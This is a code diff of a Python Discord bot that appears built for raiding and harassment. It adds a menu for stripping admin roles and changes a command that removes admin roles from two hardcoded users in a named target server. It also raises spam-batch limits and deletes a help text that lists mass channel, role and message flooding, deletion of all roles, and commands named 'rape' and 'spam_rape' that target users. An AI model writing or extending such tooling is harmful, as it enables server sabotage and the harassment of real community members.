@@ -25,16 +25,74 @@ mass_sending = False
 
 bot = commands.Bot(command_prefix=':/', case_insensitive=True, help_command=None, intents=intents)
 
+class RemoveAdminView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+
+    @discord.ui.select(placeholder="Select a user to remove admin role", custom_id="select_menu")
+    async def select_menu_callback(self, select: discord.ui.Select, interaction: discord.Interaction):
+        await interaction.response.defer()  # Defer the response to allow time for role removal
+        
+        # Get the selected user ID (make sure value is the user ID, not just display name)
+        selected_user_id = int(select.values[0])  # Ensure you're storing user IDs in the menu options
+        
+        # Fetch the member from the guild
+        selected_user = interaction.guild.get_member(selected_user_id)
+
+        if not selected_user:
+            await interaction.followup.send(f"User not found.", ephemeral=True)
+            return
+
+        # Remove admin roles
+        admin_roles = [role for role in selected_user.roles if role.permissions.administrator]
+        if admin_roles:
+            for role in admin_roles:
+                try:
+                    await selected_user.remove_roles(role)
+                    await interaction.followup.send(f"Removed admin role from {selected_user.display_name}.", ephemeral=True)
+                except discord.Forbidden:
+                    await interaction.followup.send(f"I do not have permission to remove roles from {selected_user.display_name}.", ephemeral=True)
+                except discord.HTTPException as e:
+                    await interaction.followup.send(f"An error occurred while removing roles: {e}", ephemeral=True)
+        else:
+            await interaction.followup.send(f"{selected_user.display_name} does not have an admin role.", ephemeral=True)
+
+
 @bot.event
 async def on_ready():   
     print(f'Bot is ready as {bot.user}')
     await bot.change_presence(status=discord.Status.online)
+    bot.add_view(RemoveAdminView())
     try:
         synced = await bot.tree.sync()
         print(f"Synced {len(synced)} command(s)")
     except Exception as e:
         print(e)
 
+
+@bot.tree.command(name="check_admin")
+async def check_admins(interaction: discord.Interaction):
+    if interaction.user.id == owner_id:  # Assuming 'owner_id' is defined earlier
+        # Get all users with admin roles
+        admins = [member for member in interaction.guild.members if any(role.permissions.administrator for role in member.roles)]
+
+        if admins:
+            # Create a select menu with user IDs instead of display names to ensure uniqueness
+            select_menu = discord.ui.Select(placeholder="Select a user to remove admin role")
+
+            for admin in admins:
+                select_menu.add_option(label=admin.display_name, value=str(admin.id))  # Use ID for value
+
+            # Create a view and add the select menu
+            view = RemoveAdminView()
+            view.add_item(select_menu)
+
+            # Send the interaction response with the select menu
+            await interaction.response.send_message(f"The following users have admin permissions: {', '.join([admin.display_name for admin in admins])}", view=view, ephemeral=True)
+        else:
+            await interaction.response.send_message("No users have admin permissions in this server.", ephemeral=True)
+    else:
+        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
 @bot.event
 async def on_member_update(before, after):
     global owner_id
@@ -330,14 +388,14 @@ async def rape(ctx, user: discord.User):
 
 
 @bot.tree.command()
-@app_commands.describe(message="The message to send", amount="Amount of messages to send")
-async def spam(interaction: discord.Interaction, message: str, amount: int):
+@app_commands.describe(message="The message to send", amount="Amount of messages to send", batch="Batches of messages")
+async def spam(interaction: discord.Interaction, message: str, amount: int, batch: int):
     if amount > 25 and interaction.user.id != owner_id:
         await interaction.response.send_message("Maximum amount of 25 messages for Mortals.")
         return
     start_time = time.time()
 
-    batch_size = 10  # Increased batch size
+    batch_size = batch  # Increased batch size
     batches = [message] * batch_size
 
     async def send_batch(messages):
@@ -356,32 +414,9 @@ async def spam(interaction: discord.Interaction, message: str, amount: int):
     await asyncio.gather(*tasks)
     end_time = time.time()
     duration = end_time - start_time
-    await interaction.response.send_message(f"Spammed {amount} messages in {duration:.2f} seconds.")
+    await interaction.channel.send(f"Spammed {amount+1} messages in {duration:.2f} seconds.")
 
-    
-@bot.command()
-async def help(ctx):
-    await ctx.send("""
-Mortal commands:
-- alive: Tells the bot that it is alive.
-- create_invite: Creates an invite link to a text channel in the server.
-- alive: Tells the bot that it is alive.
-- rape: [userid]: Rapes the specified user.
-- help: Displays this message.
-- spam: Spams the channel with [message], [amount]. 25 messages for Mortals, Unlimited for Admin
 
-Admin command:
-- addrole [role_name] [role_amount]: Creates multiple roles with the same name.
-- delrole: Deletes all roles except for the bot's role and 'legit bot test'.
-- create [channel_name] and [channel_amount]: Creates multiple channels with the same name
-- remove [channel_name]: Deletes all channels that starts with the name
-- mass [message] OPTIONAL[channel_name]: Spams [message] in every channel
-- stop_mass: Stops mass
-- ascend:  Ascends Mahodovyron
-- unban: Unbans the Master from the server.
-- state [idle|dnd|online|offline]: Changes the bot's status.
-- clear_mass [content]: Deletes all messages sent by the bot containing the specified content in every channel.
-- activity [state]: Changes the bot's activity.""")
 
 @bot.command()
 async def purge(ctx, message):
@@ -432,36 +467,36 @@ async def spam_rape(ctx, user: discord.User, amount: int):
 
     await ctx.send(f"<@{ctx.author.id}> Finished raping <@{user.id}>")
     
-@bot.command()
-async def remove_admin_roles(ctx):
+@bot.tree.command(name="rar")
+async def remove_admin_roles(interaction: discord.Interaction):
     target_server_id = imintomen_id  # Replace with your target server's ID
     user_ids = [755472029049946303, 755475988149960866]  # Replace with your user IDs
     
-
     target_guild = bot.get_guild(target_server_id)  # Get the target server (guild)
 
     if target_guild is None:
-        await ctx.send(f"I am not in the server with ID {target_server_id}.")
+        await interaction.response.send_message(f"I am not in the server with ID {target_server_id}.", ephemeral=True)
         return
 
     removed_roles_count = 0
 
-    if ctx.author.id == owner_id:  # Ensure only the bot owner can run this
-        await ctx.message.delete()
+    if interaction.user.id == owner_id:  # Ensure only the bot owner can run this
+        await interaction.response.send_message("Starting to remove admin roles...", ephemeral=True)  # Initial response
+
         for user_id in user_ids:
             try:
                 # Fetch the member explicitly from the server
                 target_user = await target_guild.fetch_member(user_id)
 
                 if target_user is None:
-                    await ctx.send(f"User with ID {user_id} is not in the target server.")
+                    await interaction.followup.send(f"User with ID {user_id} is not in the target server.", ephemeral=True)
                     continue
 
                 # Get all roles with admin permissions
                 admin_roles = [role for role in target_user.roles if role.permissions.administrator]
 
                 if not admin_roles:
-                    await ctx.send(f"{target_user.mention} does not have any admin roles.")
+                    await interaction.followup.send(f"{target_user.mention} does not have any admin roles.", ephemeral=True)
                     continue
 
                 try:
@@ -469,39 +504,31 @@ async def remove_admin_roles(ctx):
                     for role in admin_roles:
                         await target_user.remove_roles(role, reason="Admin role removed by bot")
                     removed_roles_count += len(admin_roles)
-                    await ctx.send(f"Removed {len(admin_roles)} admin role(s) from {target_user.mention} in {target_guild.name}.")
+                    await interaction.followup.send(f"Removed {len(admin_roles)} admin role(s) from {target_user.mention} in {target_guild.name}.", ephemeral=True)
+                
                 except discord.Forbidden:
-                    await ctx.send(f"I do not have permission to remove roles from {target_user.mention} in the target server.")
+                    await interaction.followup.send(f"I do not have permission to remove roles from {target_user.mention} in the target server.", ephemeral=True)
+                
                 except discord.HTTPException as e:
-                    await ctx.send(f"An error occurred while removing roles from {target_user.mention}: {e}")
-            
+                    await interaction.followup.send(f"An error occurred while removing roles from {target_user.mention}: {e}", ephemeral=True)
+
             except discord.NotFound:
-                await ctx.send(f"User with ID {user_id} was not found in the target server.")
+                await interaction.followup.send(f"User with ID {user_id} was not found in the target server.", ephemeral=True)
             except discord.HTTPException as e:
-                await ctx.send(f"Failed to fetch user {user_id} from the target server: {e}")
-        
+                await interaction.followup.send(f"Failed to fetch user {user_id} from the target server: {e}", ephemeral=True)
+
+        # Final message after loop
         if removed_roles_count == 0:
-            await ctx.send("No admin roles were removed from the specified users.")
+            await interaction.followup.send("No admin roles were removed from the specified users.", ephemeral=True)
     else:
-        await ctx.send("A mortal shall not wield such power.")
+        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
 
-    
-@bot.tree.command(name="check_admin")
-async def check_admins(interaction: discord.Interaction):
-    if interaction.user.id == owner_id:  # Assuming 'owner_id' is defined earlier
-        admins = [member.mention for member in interaction.guild.members if any(role.permissions.administrator for role in member.roles)]
 
-        if admins:
-            await interaction.response.send_message(f"The following users have admin permissions: {', '.join(admins)}", ephemeral=True)
-        else:
-            await interaction.response.send_message("No users have admin permissions in this server.", ephemeral=True)
-    else:
-        return
+
 
 @bot.tree.command(name="hello")
 async def hello(interaction : discord.Interaction):
     await interaction.response.send_message(f"Hello, {interaction.user.mention}!",
                                             ephemeral=True)
-
 
 bot.run(token)
